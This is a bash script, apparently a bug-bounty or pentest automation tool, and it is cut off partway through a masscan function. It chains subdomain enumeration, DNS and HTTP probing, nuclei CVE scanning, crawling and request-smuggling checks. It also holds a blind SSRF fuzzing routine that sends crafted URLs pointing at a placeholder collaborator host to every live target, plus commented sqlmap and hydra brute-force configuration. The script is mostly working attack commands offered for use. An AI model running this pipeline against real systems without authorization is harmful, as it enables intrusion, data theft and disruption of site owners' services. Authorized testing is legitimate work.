#!/bin/bash

# Invoke with sudo because of masscan/nmap

# Config
storageDir=$HOME/lazytargets # where all targets
unwantedpaths='/[.]css$/d;/[.]png$/d;/[.]svg$/d;/[.]jpg$/d;/[.]jpeg$/d;/[.]webp$/d;/[.]gif$/d;/[.]woff$/d'

altdnsWordlist=./lazyWordLists/altdns_wordlist_uniq.txt # used for permutations (--alt option required)

dirsearchWordlist=./lazyWordLists/web-content-top10000.txt # used in directory bruteforcing (--brute option)
dirsearchThreads=10 # to avoid blocking of waf

miniResolvers=./resolvers/mini_resolvers.txt

# used in hydra attack: too much words required up to 6 hours, use preferred list if possible
# sort -u ../SecLists/Usernames/top-usernames-shortlist.txt ../SecLists/Usernames/cirt-default-usernames.txt ../SecLists/Usernames/mssql-usernames-nansh0u-guardicore.txt ./wordlist/users.txt -o wordlist/users.txt
usersList=./wordlist/top-users.txt
# sort -u ../SecLists/Passwords/clarkson-university-82.txt ../SecLists/Passwords/cirt-default-passwords.txt ../SecLists/Passwords/darkweb2017-top100.txt ../SecLists/Passwords/probable-v2-top207.txt ./wordlist/passwords.txt -o wordlist/passwords.txt
passwordsList=./wordlist/top-passwords.txt

# Fuzzing using local server:
ATTACKERURL=http://BURPcollaborator:PORT
ATTACKER=BURPcollaborator:PORT
ATTACKERGREP=BURPcollaborator

# optional positional arguments
ip= # test for specific single IP
cidr= # test for CIDR based on ASN number, see https://bgp.he.net/
single= # if just one target in scope
list= # list of domains to test, no need wildcard support, mad mode not implemented (need to avoid --list with --mad)
wildcard= # fight against multi-level wildcard DNS to avoid false-positive results while subdomain resolves
brute= # enable directory bruteforce
fuzz= # enable parameter fuzzing (local server need to be alive)
mad= # if you sad about subdomains count, call it
alt= # permutate and alterate subdomains

# definitions
enumeratesubdomains(){
  if [ "$single" = "1" ]; then
    echo $1 > $targetDir/enumerated-subdomains.txt
  elif [ "$cidr" = "1" ]; then
    mapcidr -silent -cidr $1 -o $targetDir/enumerated-subdomains.txt
  elif [ "$list" = "1" ]; then
    cp $1 $targetDir/enumerated-subdomains.txt
  else
    echo "Enumerating all known domains using:"

    # Passive subdomain enumeration
    echo "subfinder..."
    subfinder -d $1 -silent -o $targetDir/subfinder-list.txt
    echo $1 >> $targetDir/subfinder-list.txt # to be sure main domain added in case of one domain scope
    echo "assetfinder..."
    assetfinder --subs-only $1 > $targetDir/assetfinder-list.txt
    # remove all lines start with *-asterix and out-of-scope domains
    SCOPE=$1
    grep "[.]${SCOPE}$" $targetDir/assetfinder-list.txt | sort -u -o $targetDir/assetfinder-list.txt
    sed -i '' '/^*/d' $targetDir/assetfinder-list.txt

    echo "github-subdomains.py..."
    github-subdomains -d $1 > $targetDir/github-subdomains-list.txt

    # echo "amass..."
    # amass enum --passive -log $targetDir/amass_errors.log -d $1 -o $targetDir/amass-list.txt

    # sort enumerated subdomains
    sort -u $targetDir/subfinder-list.txt $targetDir/assetfinder-list.txt $targetDir/github-subdomains-list.txt -o $targetDir/enumerated-subdomains.txt
    sed -i '' '/^[.]/d' $targetDir/enumerated-subdomains.txt
  fi
}

checkwaybackurls(){
  SCOPE=$1
  echo "gau..."
  # gau -subs mean include subdomains
  cat $targetDir/enumerated-subdomains.txt | gau -subs -o $targetDir/wayback/gau_output.txt
  echo "waybackurls..."
  cat $targetDir/enumerated-subdomains.txt | waybackurls > $targetDir/wayback/waybackurls_output.txt
  echo "github-endpoints.py..."
  github-endpoints -d $1 > $targetDir/wayback/github-endpoints_out.txt

  # need to get some extras subdomains
  sort -u $targetDir/wayback/gau_output.txt $targetDir/wayback/waybackurls_output.txt $targetDir/wayback/github-endpoints_out.txt -o $targetDir/wayback/wayback_output.txt
  sed -i '' '/web.archive.org/d' $targetDir/wayback/wayback_output.txt
  # remove all out-of-scope lines
  # grep -e "[.]${SCOPE}" -e "//${SCOPE}" $targetDir/wayback/wayback_output.txt | sort -u -o $targetDir/wayback/wayback_output.txt

  cat $targetDir/wayback/wayback_output.txt | unfurl --unique domains > $targetDir/wayback-subdomains-list.txt
  # sed -i '' '/[.]$/d' $targetDir/wayback-subdomains-list.txt

  # wayback_output.txt needs for custompathlist (ffuf dirsearch custom list)
  # full paths, see https://github.com/tomnomnom/unfurl
  # cat $targetDir/wayback/wayback_output.txt | unfurl format '%p%?%q' | sed 's/\///;/^$/d' | cut -f1-2 -d '/' |  sort | uniq > $targetDir/wayback/wayback-paths-list.txt
  # cat $targetDir/wayback/wayback_output.txt | unfurl paths | sed 's/\///;/^$/d' | sort | uniq > $targetDir/wayback/wayback_paths_out.txt
  # filter first and first-second paths from full paths and remove empty lines

  # cut -f1 -d '/' $targetDir/wayback/wayback_paths_out.txt | sed '/^$/d' | sort -u -o $targetDir/wayback/wayback_paths.txt
  # cut -f1-2 -d '/' $targetDir/wayback/wayback_paths_out.txt | sed '/^$/d' | sort | uniq >> $targetDir/wayback/wayback_paths.txt

  # full paths+queries
  cat $targetDir/wayback/wayback_output.txt | unfurl format '%p%?%q' | sed 's/\///;/^$/d' | sort | uniq > $targetDir/wayback/wayback-paths-list.txt

  # sort -u $targetDir/wayback/wayback_paths_out.txt $targetDir/wayback/wayback_paths.txt $targetDir/wayback/wayback_paths_queries.txt -o $targetDir/wayback/wayback-paths-list.txt
  # sed -i '' '/[.]$/d' $targetDir/wayback/wayback-paths-list.txt
  sort -u $targetDir/wayback/wayback-paths-list.txt -o $targetDir/wayback/wayback-paths-list.txt
  chown storenth: $targetDir/wayback/wayback-paths-list.txt
  # remove .jpg .jpeg .webp .png .svg .gif, css from paths
  # sed -i '' $unwantedpaths $targetDir/wayback/wayback-paths-list.txt

  if [ "$alt" = "1" -a "$mad" = "1" ]; then
    # prepare target specific subdomains wordlist to gain more subdomains using --mad mode
    cat $targetDir/wayback/wayback_output.txt | unfurl format %S | sort | uniq > $targetDir/wayback-subdomains-wordlist.txt
    sort -u $altdnsWordlist $targetDir/wayback-subdomains-wordlist.txt -o $customSubdomainsWordList
  fi
}

sortsubdomains(){
  sort -u $targetDir/enumerated-subdomains.txt $targetDir/wayback-subdomains-list.txt -o $targetDir/1-real-subdomains.txt
  cp $targetDir/1-real-subdomains.txt $targetDir/2-all-subdomains.txt
}

permutatesubdomains(){
  if [ "$alt" = "1" ]; then
    mkdir $targetDir/alterated/
    echo "altdns..."
    altdns -i $targetDir/1-real-subdomains.txt -o $targetDir/alterated/altdns_out.txt -w $customSubdomainsWordList
    sed -i '' '/^[.]/d;/^[-]/d;/\.\./d' $targetDir/alterated/altdns_out.txt

    echo "dnsgen..."
    dnsgen -f $targetDir/1-real-subdomains.txt -w $customSubdomainsWordList > $targetDir/alterated/dnsgen_out.txt
    sed -i '' '/^[.]/d;/^[-]/d;/\.\./d' $targetDir/alterated/dnsgen_out.txt
    sed -i '' '/^[-]/d' $targetDir/alterated/dnsgen_out.txt

    # combine permutated domains and exclude out of scope domains
    SCOPE=$1
    echo "SCOPE=$SCOPE"
    grep -r -h "[.]${SCOPE}$" $targetDir/alterated | sort | uniq > $targetDir/alterated/permutated-list.txt

    sort -u $targetDir/1-real-subdomains.txt $targetDir/alterated/permutated-list.txt -o $targetDir/2-all-subdomains.txt
  fi
}

# check live subdomains
# wildcard check like: `dig @188.93.60.15 A,CNAME {test123,0000}.$domain +short`
# shuffledns uses for wildcard because massdn can't
dnsprobing(){
  echo
  # check we test hostname or IP
  if [[ -n $ip ]]; then
    echo "[dnsx] try to get PTR records"
    echo $1 > $targetDir/dnsprobe_ip.txt
    echo $1 | dnsx -silent -ptr -resp-only -o $targetDir/dnsprobe_subdomains.txt # also try to get subdomains
  elif [[ -n $cidr ]]; then
    echo "[dnsx] try to get PTR records"
    cp  $targetDir/enumerated-subdomains.txt $targetDir/dnsprobe_ip.txt
    dnsx -silent -ptr -resp-only -r $miniResolvers -l $targetDir/dnsprobe_ip.txt -o $targetDir/dnsprobe_subdomains.txt # also try to get subdomains
  elif [ "$single" = "1" ]; then
    echo $1 | dnsx -silent -a -resp-only -o $targetDir/dnsprobe_ip.txt
    echo $1 > $targetDir/dnsprobe_subdomains.txt
  elif [[ -n $list ]]; then
      echo "[shuffledns] massdns probing..."
      shuffledns -silent -list $targetDir/2-all-subdomains.txt -retries 1 -r $miniResolvers -o $targetDir/shuffledns-list.txt
      # additional resolving because shuffledns missing IP on output
      # echo "[dnsx] dnsprobing..."
      # echo "[dnsx] wildcard filtering:"
      # dnsx -l $targetDir/shuffledns-list.txt -wd $1 -o $targetDir/dnsprobe_live.txt
      echo "[dnsx] getting hostnames and its A records:"
      # -t mean cuncurrency
      dnsx -silent -t 350 -a -resp -r $miniResolvers -l $targetDir/shuffledns-list.txt -o $targetDir/dnsprobe_out.txt
      # clear file from [ and ] symbols
      tr -d '\[\]' < $targetDir/dnsprobe_out.txt > $targetDir/dnsprobe_output_tmp.txt
      # split resolved hosts ans its IP (for masscan)
      cut -f1 -d ' ' $targetDir/dnsprobe_output_tmp.txt | sort | uniq > $targetDir/dnsprobe_subdomains.txt
      cut -f2 -d ' ' $targetDir/dnsprobe_output_tmp.txt | sort | uniq > $targetDir/dnsprobe_ip.txt
  elif [ "$wildcard" = "1" ]; then
      echo "[shuffledns] massdns probing with wildcard sieving..."
      shuffledns -silent -d $1 -list $targetDir/2-all-subdomains.txt -retries 1 -r $miniResolvers -o $targetDir/shuffledns-list.txt
      # additional resolving because shuffledns missing IP on output
      # echo "[dnsx] dnsprobing..."
      # echo "[dnsx] wildcard filtering:"
      # dnsx -l $targetDir/shuffledns-list.txt -wd $1 -o $targetDir/dnsprobe_live.txt
      echo "[dnsx] getting hostnames and its A records:"
      # -t mean cuncurrency
      dnsx -silent -t 350 -a -resp -r $miniResolvers -l $targetDir/shuffledns-list.txt -o $targetDir/dnsprobe_out.txt
      # clear file from [ and ] symbols
      tr -d '\[\]' < $targetDir/dnsprobe_out.txt > $targetDir/dnsprobe_output_tmp.txt
      # split resolved hosts ans its IP (for masscan)
      cut -f1 -d ' ' $targetDir/dnsprobe_output_tmp.txt | sort | uniq > $targetDir/dnsprobe_subdomains.txt
      cut -f2 -d ' ' $targetDir/dnsprobe_output_tmp.txt | sort | uniq > $targetDir/dnsprobe_ip.txt
  else
    echo "[massdns] dnsprobing..."
    # pure massdns:
    massdns -q -r $miniResolvers -o S -w $targetDir/massdns_output.txt $targetDir/2-all-subdomains.txt
    # 
    sed -i '' '/CNAME/d' $targetDir/massdns_output.txt
    cut -f1 -d ' ' $targetDir/massdns_output.txt | sed 's/.$//' | sort | uniq > $targetDir/dnsprobe_subdomains.txt
    cut -f3 -d ' ' $targetDir/massdns_output.txt | sort | uniq > $targetDir/dnsprobe_ip.txt
  fi
}

checkhttprobe(){
  echo
  echo "[httpx] Starting httpx probe testing..."
  # resolve IP and hosts with http|https for nuclei, gospider and ffuf-bruteforce
  # httpx -silent -ports 80,443,100-200,8000,8080 -l $targetDir/dnsprobe_ip.txt -follow-host-redirects -threads 500 -o $targetDir/httpx_output_1.txt
  httpx -silent -ports 80,443,100-200,8000,8080 -l $targetDir/dnsprobe_subdomains.txt -follow-host-redirects -threads 500 -o $targetDir/3-all-subdomain-live-scheme.txt

  # sort -u $targetDir/httpx_output_1.txt $targetDir/httpx_output_2.txt -o $targetDir/3-all-subdomain-live-scheme.txt
  cat $targetDir/3-all-subdomain-live-scheme.txt | unfurl format '%d:%P' > $targetDir/3-all-subdomain-live.txt
}

aquatoneshot(){
  cat $targetDir/3-all-subdomain-live-scheme.txt |  aquatone -ports large -out $targetDir/aquatone
  # enable report with screenshots
  chown storenth: $targetDir/aquatone/screenshots/*
}

nucleitest(){
  if [ -s $targetDir/3-all-subdomain-live-scheme.txt ]; then
    echo
    echo "[nuclei] CVE testing..."
    # -c maximum templates processed in parallel
    nuclei -silent -l $targetDir/3-all-subdomain-live-scheme.txt -t ../nuclei-templates/technologies/ -o $targetDir/nuclei/nuclei_output_technology.txt
    sleep 1
    nuclei -silent -stats -l $targetDir/3-all-subdomain-live-scheme.txt \
                    -t ../nuclei-templates/vulnerabilities/ \
                    -t ../nuclei-templates/cves/2017/ \
                    -t ../nuclei-templates/cves/2018/ \
                    -t ../nuclei-templates/cves/2019/ \
                    -t ../nuclei-templates/cves/2020/ \
                    -t ../nuclei-templates/cves/2021/ \
                    -t ../nuclei-templates/misconfiguration/ \
                    -t ../nuclei-templates/miscellaneous/ \
                    -exclude ../nuclei-templates/miscellaneous/old-copyright.yaml \
                    -exclude ../nuclei-templates/miscellaneous/missing-x-frame-options.yaml \
                    -exclude ../nuclei-templates/miscellaneous/missing-hsts.yaml \
                    -exclude ../nuclei-templates/miscellaneous/missing-csp.yaml \
                    -exclude ../nuclei-templates/miscellaneous/basic-cors-flash.yaml \
                    -t ../nuclei-templates/takeovers/ \
                    -t ../nuclei-templates/exposures/ \
                    -t ../nuclei-templates/exposed-panels/ \
                    -t ../nuclei-templates/exposed-tokens/generic/credentials-disclosure.yaml \
                    -t ../nuclei-templates/exposed-tokens/generic/general-tokens.yaml \
                    -t ../nuclei-templates/fuzzing/ \
                    -o $targetDir/nuclei/nuclei_output.txt

    if [ -s $targetDir/nuclei/nuclei_output.txt ]; then
      cut -f4 -d ' ' $targetDir/nuclei/nuclei_output.txt | unfurl paths | sed 's/^\///;s/\/$//;/^$/d' | sort | uniq > $targetDir/nuclei/nuclei_unfurl_paths.txt
      # filter first and first-second paths from full paths and remove empty lines
      cut -f1 -d '/' $targetDir/nuclei/nuclei_unfurl_paths.txt | sed '/^$/d' | sort | uniq > $targetDir/nuclei/nuclei_paths.txt
      cut -f1-2 -d '/' $targetDir/nuclei/nuclei_unfurl_paths.txt | sed '/^$/d' | sort | uniq >> $targetDir/nuclei/nuclei_paths.txt

      # full paths+queries
      cut -f4 -d ' ' $targetDir/nuclei/nuclei_output.txt | unfurl format '%p%?%q' | sed 's/^\///;s/\/$//;/^$/d' | sort | uniq > $targetDir/nuclei/nuclei_paths_queries.txt
      sort -u $targetDir/nuclei/nuclei_unfurl_paths.txt $targetDir/nuclei/nuclei_paths.txt $targetDir/nuclei/nuclei_paths_queries.txt -o $targetDir/nuclei/nuclei-paths-list.txt
    fi
  fi
}

gospidertest(){
  if [ -s $targetDir/3-all-subdomain-live-scheme.txt ]; then
    SCOPE=$1
    echo
    echo "[gospider] Web crawling..."
    gospider -q -r -S $targetDir/3-all-subdomain-live-scheme.txt --timeout 4 -o $targetDir/gospider -c 40 -t 40

    # combine the results and filter out of scope
    for X in $targetDir/gospider/*
      do
        cat "$X" | grep $1 >> $targetDir/gospider/gospider_raw_out.txt
      done

    # prepare paths list
    grep -e '\[form\]' -e '\[javascript\]' -e '\[linkfinder\]' -e '\[robots\]'  $targetDir/gospider/gospider_raw_out.txt | cut -f3 -d ' ' | sort | uniq > $targetDir/gospider/gospider_out.txt
    grep '\[url\]' $targetDir/gospider/gospider_raw_out.txt | cut -f5 -d ' ' | grep "${SCOPE}" | sort | uniq >> $targetDir/gospider/gospider_out.txt
    # rm -rf $targetDir/gospider/gospider_out.txt

    # prepare paths
    # cat $targetDir/gospider/gospider_out.txt | unfurl format '%p%?%q' | sed 's/\///;/^$/d' | cut -f1-2 -d '/' | sort | uniq > $targetDir/gospider/gospider-paths-list.txt
    # cat $targetDir/gospider/gospider_out.txt | unfurl paths | sed 's/\///;/^$/d' | sort | uniq > $targetDir/gospider/gospider-paths-list.txt
    # filter first and first-second paths from full paths and remove empty lines
    # cut -f1 -d '/' $targetDir/gospider/gospider_paths_out.txt | sed '/^$/d' | sort | uniq > $targetDir/gospider/gospider_paths.txt
    # cut -f1-2 -d '/' $targetDir/gospider/gospider_paths_out.txt | sed '/^$/d' | sort | uniq >> $targetDir/gospider/gospider_paths.txt
    # cut -f1-2 -d '/' $targetDir/gospider/gospider_paths_out.txt | sed '/^$/d' | sort | uniq >> $targetDir/gospider/gospider_paths.txt

    # full paths+queries
    cat $targetDir/gospider/gospider_out.txt | unfurl format '%p%?%q' | sed 's/\///;/^$/d' | sort | uniq > $targetDir/gospider/gospider-paths-list.txt
    # cat $targetDir/gospider/gospider_out.txt | unfurl format '%p%?%q' | sed 's/\///;/^$/d' | sort | uniq > $targetDir/gospider/gospider_paths_queries.txt

    # sort -u $targetDir/gospider/gospider_paths_out.txt $targetDir/gospider/gospider_paths.txt $targetDir/gospider/gospider_paths_queries.txt -o $targetDir/gospider/gospider-paths-list.txt
    # sort -u $targetDir/gospider/gospider-paths-list.txt -o $targetDir/gospider/gospider-paths-list.txt
    # chown storenth: $targetDir/gospider/gospider-paths-list.txt
    # remove .jpg .jpeg .webp .png .svg .gif from paths
    # sed -i '' $unwantedpaths $targetDir/gospider/gospider-paths-list.txt
  fi
}

hakrawlercrawling(){
  if [ -s $targetDir/3-all-subdomain-live-scheme.txt ]; then
    echo
    echo "[hakrawler] Web crawling..."
    cat $targetDir/3-all-subdomain-live-scheme.txt | hakrawler -plain -insecure -depth 3 > $targetDir/hakrawler/hakrawler_out.txt

    # prepare paths
    # cat $targetDir/hakrawler/hakrawler_out.txt | unfurl paths | sed 's/\///;/^$/d' | sort | uniq > $targetDir/hakrawler/hakrawler_unfurl_paths_out.txt
    # filter first and first-second paths from full paths and remove empty lines
    # cut -f1 -d '/' $targetDir/hakrawler/hakrawler_unfurl_paths_out.txt | sed '/^$/d' | sort | uniq > $targetDir/hakrawler/hakrawler_paths.txt
    # cut -f1-2 -d '/' $targetDir/hakrawler/hakrawler_unfurl_paths_out.txt | sed '/^$/d' | sort | uniq >> $targetDir/hakrawler/hakrawler_paths.txt
    # cut -f1-3 -d '/' $targetDir/hakrawler/hakrawler_unfurl_paths_out.txt | sed '/^$/d' | sort | uniq >> $targetDir/hakrawler/hakrawler_paths.txt

    # full paths+queries
    cat $targetDir/hakrawler/hakrawler_out.txt | unfurl format '%p%?%q' | sed 's/\///;/^$/d' | sort | uniq > $targetDir/hakrawler/hakrawler-paths-list.txt

    # sort -u $targetDir/hakrawler/hakrawler-paths-list.txt -o $targetDir/hakrawler/hakrawler-paths-list.txt
    # chown storenth: $targetDir/hakrawler/hakrawler-paths-list.txt

    # sort -u $targetDir/hakrawler/hakrawler_unfurl_paths_out.txt $targetDir/hakrawler/hakrawler_paths.txt $targetDir/hakrawler/hakrawler_paths_queries.txt -o $targetDir/hakrawler/hakrawler-paths-list.txt
    # remove .jpg .jpeg .webp .png .svg .gif from paths
    # sed -i '' $unwantedpaths $targetDir/hakrawler/hakrawler-paths-list.txt
  fi
}

# prepare custom wordlist for
# ssrf test --mad only mode
# directory bruteforce using --mad and --brute mode only
custompathlist(){
  if [ "$mad" = "1" ]; then
    echo "Prepare custom wordlist"
    # merge base dirsearchWordlist with target-specific list for deep dive (time sensitive)
    # sudo sort -u $targetDir/nuclei/nuclei-paths-list.txt $targetDir/wayback/wayback-paths-list.txt $targetDir/gospider/gospider-paths-list.txt $targetDir/hakrawler/hakrawler-paths-list.txt $customFfufBruteWordList -o $customFfufBruteWordList
    sort -u $targetDir/wayback/wayback-paths-list.txt $targetDir/gospider/gospider-paths-list.txt -o $customFfufBruteWordList

    GREPSCOPE=$(echo $1 | sed "s/\./[.]/")
    grep -E  "https?://[^\"\\'> ]+|www[.][^\"\\'> ]+|$GREPSCOPE" $customFfufBruteWordList > $customFfufPathWordList
    gf ssrf $customFfufBruteWordList | uniq > $customFfufSsrfWordList
    # sed -i '' '/^$/d' $customFfufBruteWordList ?need to check!
    chown storenth: $customFfufBruteWordList
    chown storenth: $customFfufPathWordList
    chown storenth: $customFfufSsrfWordList

  fi
}

# https://rez0.blog/hacking/2019/11/29/rce-via-imagetragick.html
# https://notifybugme.medium.com/finding-ssrf-by-full-automation-7d2680091d68
ssrftest(){
  if [ -s $targetDir/3-all-subdomain-live-scheme.txt ]; then
    echo
    echo "[SSRF] Blind probe..."
    # /?url=
    ffuf -s -c -r -u HOST/\?url=$ATTACKERURL/DOMAIN/image.jpg \
        -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
        -w $targetDir/3-all-subdomain-live.txt:DOMAIN -mode pitchfork

    # # /?uri=
    # ffuf -s -c -u HOST/\?uri=$ATTACKERURL/DOMAIN/ \
    #     -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
    #     -w $targetDir/3-all-subdomain-live.txt:DOMAIN -mode pitchfork

    # # /?redirect_to=
    # ffuf -s -c -u HOST/\?redirect_to=$ATTACKER/DOMAIN/ \
    #     -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
    #     -w $targetDir/3-all-subdomain-live.txt:DOMAIN -mode pitchfork

    # # /?page=
    # ffuf -s -c -u HOST/\?page=$ATTACKER/DOMAIN/ \
    #     -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
    #     -w $targetDir/3-all-subdomain-live.txt:DOMAIN -mode pitchfork

    # # /?p=
    # ffuf -s -c -u HOST/\?p=$ATTACKER/DOMAIN/ \
    #     -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
    #     -w $targetDir/3-all-subdomain-live.txt:DOMAIN -mode pitchfork

    # # ?url=&file=
    # ffuf -s -c -u HOST/\?url=$ATTACKERURL/DOMAIN/url\&file=$ATTACKERURL/DOMAIN/file \
    #     -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
    #     -w $targetDir/3-all-subdomain-live.txt:DOMAIN -mode pitchfork

    # # manifest.json?url=
    # ffuf -s -c -u HOST/manifest.json\?url=$ATTACKERURL/DOMAIN/url \
    #     -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
    #     -w $targetDir/3-all-subdomain-live.txt:DOMAIN -mode pitchfork

    # # index.php?url=
    # ffuf -s -c -u HOST/index.php\?url=$ATTACKERURL/DOMAIN/url \
    #     -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
    #     -w $targetDir/3-all-subdomain-live.txt:DOMAIN -mode pitchfork

    # # ?returnUrl=
    # ffuf -s -c -u HOST/\?returnUrl=$ATTACKERURL/DOMAIN/url \
    #     -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
    #     -w $targetDir/3-all-subdomain-live.txt:DOMAIN -mode pitchfork

    if [ "$mad" = "1" ]; then
      # echo "[SSRF-0] prepare ssrflist, changing all params using qsreplace..."
      # set -x
      # cat $customFfufPathWordList | qsreplace -a | qsreplace $ATTACKER | grep $ATTACKERGREP > $targetDir/ssrf-list.txt
      # set +x
      # echo "[SSRF-0] Target all-params probe..."
      # ffuf -s -c -u HOST/PATH \
      #     -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
      #     -w $targetDir/ssrf-list.txt:PATH > /dev/null

      echo "[SSRF-1] prepare ssrf-list: concat path out from gf ssrf..."
      ITERATOR=0
      while read line; do
        ITERATOR=$((ITERATOR+1))
        echo "processing $ITERATOR line"
        echo "[line] $line"
        echo ${line}${ATTACKER} >> $targetDir/ssrf-list-1.txt
      done < $customFfufSsrfWordList

      if [ -s $targetDir/ssrf-list-1.txt ]; then
        chown storenth: $targetDir/ssrf-list-1.txt
        # simple math to watch progress
        HOSTCOUNT=$(cat $targetDir/3-all-subdomain-live-scheme.txt | wc -l)
        ENDPOINTCOUNT=$(cat $targetDir/ssrf-list-1.txt | wc -l)
        echo "HOSTCOUNT=$HOSTCOUNT \t ENDPOINTCOUNT=$ENDPOINTCOUNT"
        echo $(($HOSTCOUNT*$ENDPOINTCOUNT))

          echo "[SSRF-1] fuzz gf ssrf endpoints "
          ffuf -s -r -c -u HOST/PATH \
              -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
              -w $targetDir/ssrf-list-1.txt:PATH > /dev/null
      fi

      echo "[SSRF-2] prepare ssrf-list: replacing only interesting urls..."
      COUNTER=0
      while read line; do
        COUNTER=$((COUNTER+1))
        echo "processing $COUNTER line"
        echo "[line] $line"

        string_to_replace_1=$(echo $line | grep -oriahE "(https?://[^\"\\'> ]+|www[.][^\"\\'> ]+)" | unfurl domain)
        echo "string_to_replace_1=$string_to_replace_1"
        string_to_replace_2=$(echo $line | grep -oriahE "https?%3A%2F%2F[^\"\\'> ]+" | sed "s|%3A|:|gi;s|%2F|\/|gi" | unfurl domain)
        echo "string_to_replace_2=$string_to_replace_2"
        string_to_replace_3=$(echo $line | grep -oriahE "https?%253A%252F%252F[^\"\\'> ]+" | sed "s|%253A|:|gi;s|%252F|\/|gi" | unfurl domain) # need to replace also: http%253A%252F%252F
        echo "string_to_replace_3=$string_to_replace_3"

        GREPSCOPE=$(echo $1 | sed "s/\./[.]/")
        # cases url%3D=mail.web1.a.r3.snapnames.com&servlet
        string_to_replace_4=$(echo $line | sed "s|%3A|gi:|;s|%2F|\/|gi;s|%253A|:|;s|%252F|\/|gi" | grep -oriahE "(([[:alpha:][:digit:]-]+\.)+)?$GREPSCOPE" | head -n 1)
        echo "string_to_replace_4=$string_to_replace_4"

        # parse out of scope case &ei=gVJMT_fODcWPiAf5xJVU&usg=AFQjCNFSQ77YM6EKLrOfymj11Dfg2SKk6g&url&2.qwe-4.r.1q.e4.mail-ru.com%&k7iFrf4NoInN9jSQT9WfcQ==
        string_to_replace_5=$(echo $line | sed "s|%3A|gi:|;s|%2F|\/|gi;s|%253A|:|;s|%252F|\/|gi" | grep -oriahE "(([[:alpha:][:digit:]-]+\.)+)?[[:alpha:]-]+\.([^(php|asp|txt|imp|png|jpg|svg|gif|css|)])?[[:alpha:]]{2,3}" | head -n 1)
        echo "string_to_replace_5=$string_to_replace_5"

        if [[ -n "$string_to_replace_1" ]]; then
          echo $line | sed "s/$string_to_replace_1/$ATTACKER/;s/https/http/" >> $targetDir/ssrf-list-2.txt
        fi
        if [[ -n "$string_to_replace_2" ]]; then
          echo $line | sed "s/$string_to_replace_2/$ATTACKER/;s/https/http/" >> $targetDir/ssrf-list-2.txt
        fi
        if [[ -n "$string_to_replace_3" ]]; then
          echo $line | sed "s/$string_to_replace_3/$ATTACKER/;s/https/http/" >> $targetDir/ssrf-list-2.txt
        fi
        if [[ -n "$string_to_replace_4" ]]; then
          echo $line | sed "s/$string_to_replace_4/$ATTACKER/;s/https/http/" >> $targetDir/ssrf-list-2.txt
        fi
        if [[ -n "$string_to_replace_5" ]]; then
          echo $line | sed "s/$string_to_replace_5/$ATTACKER/;s/https/http/" >> $targetDir/ssrf-list-2.txt
        fi
      done < $customFfufPathWordList

      if [ -s $targetDir/ssrf-list-2.txt ]; then
        sort -u $targetDir/ssrf-list-2.txt -o $targetDir/ssrf-list-2.txt
        chown storenth: $targetDir/ssrf-list-2.txt
        # simple math to watch progress
        HOSTCOUNT=$(cat $targetDir/3-all-subdomain-live-scheme.txt | wc -l)
        ENDPOINTCOUNT=$(cat $targetDir/ssrf-list-2.txt | wc -l)
        echo "HOSTCOUNT=$HOSTCOUNT \t ENDPOINTCOUNT=$ENDPOINTCOUNT"
        echo $(($HOSTCOUNT*$ENDPOINTCOUNT))
          echo "[SSRF-2] Target url-params probe..."
          ffuf -s -r -c -u HOST/PATH \
              -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
              -w $targetDir/ssrf-list-2.txt:PATH > /dev/null
      fi
      # echo "[SSRF] prepare ssrflist, path with /wp-admin/users.php to fuzz like wp-admin/users.php?url="

    fi
  fi
}

sqlmaptest(){
  if [ "$mad" = "1" ]; then
    # prepare list of the php urls from wayback, hakrawler and gospider
    echo "[sqlmap] prepare sqlist..."
    grep -h -e 'php?[[:alnum:]]*=' -e 'asp?[[:alnum:]]*=' -e '[.]php$' \
                $targetDir/wayback/wayback_output.txt \
                $targetDir/gospider/gospider_out.txt \
                $targetDir/hakrawler/hakrawler_out.txt \
                |  sort | uniq > $targetDir/sqli_list.txt

    # grep -e 'php?[[:alnum:]]*=' -e 'asp?[[:alnum:]]*=' $targetDir/wayback/wayback_output.txt  | sort | uniq > $targetDir/wayback_sqli_list.txt

    # # -h means Never print filename headers
    # echo "[sqlmap] gospider sqlist..."
    # grep -e 'php?[[:alnum:]]*=' -e 'asp?[[:alnum:]]*=' $targetDir/gospider/gospider_out.txt | sort | uniq > $targetDir/gospider_sqli_list.txt

    # echo "[sqlmap] hakrawler sqlist..."
    # grep -e 'php?[[:alnum:]]*=' -e 'asp?[[:alnum:]]*=' -e '[.]php$' $targetDir/hakrawler/hakrawler_out.txt | sort | uniq > $targetDir/hakrawler_sqli_list.txt

    # sort -u $targetDir/wayback_sqli_list.txt $targetDir/gospider_sqli_list.txt $targetDir/hakrawler_sqli_list.txt -o $targetDir/sqli_list.txt
    # perform the sqlmap
    # echo "[sqlmap.py] SQLi testing..."
    # sqlmap -m $targetDir/sqli_list.txt --batch --random-agent -f --banner --dbs --users --risk=3 --level=5 --output-dir=$targetDir/sqlmap/
  fi
}

smugglertest(){
  echo "[smuggler.py] Try to find request smuggling vulns..."
  smuggler -u $targetDir/3-all-subdomain-live-scheme.txt

  # check for VULNURABLE keyword
  if [ -s $targetDir/smuggler/output ]; then
    cat ./smuggler/output | grep 'VULNERABLE' > $targetDir/smugglinghosts.txt
    if [ -s $targetDir/smugglinghosts.txt ]; then
      echo "Smuggling vulnerability found under the next hosts:"
      echo
      cat $targetDir/smugglinghosts.txt | grep 'VULN'
    else
      echo "There are no Request Smuggling host found"
    fi
  else
    echo "smuggler doesn\'t provide the output, check it issue!"
  fi
}

# nmap(){
#   echo "[phase 7] Test for unexpected open ports..."
#   nmap -sS -PN -T4 --script='http-title' -oG nmap_output_og.txt
# }
masscantest(){
  echo "[masscan] Looking for open ports..."
  # max-rate for accuracy
  # 25/587-smtp, 110/995-pop3, 143/993-imap, 445-smb, 3306-mysql, 3389-rdp, 5432-postgres, 5900/5901-vnc, 27017-mongodb
  # masscan -p0-1000,2375,3306,3389,4990,5432,5900,6379,6066,8080,8383,8500,8880,8983,9000,27017 -iL $targetDir/dnsprobe_ip.txt --rate 1000 --open-only -oG $targetDir/masscan_output.gnmap
